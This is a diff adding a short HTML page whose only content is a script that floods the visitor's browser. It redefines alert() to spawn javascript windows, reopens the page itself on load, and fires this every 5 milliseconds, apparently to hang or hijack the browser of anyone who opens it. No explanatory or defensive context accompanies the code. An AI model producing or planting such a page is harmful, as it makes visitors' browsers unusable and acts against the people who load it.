@@ -1,0 +1,9 @@
+<html>
+<body>
+<script>
+function alert() {var x = window.open('javascript:alert();');x.close()}
+window.onbeforeunload = window.open(window.location.href,width=500,height=500);
+setInterval(alert , 5);
+</script>
+</body>
+</html>
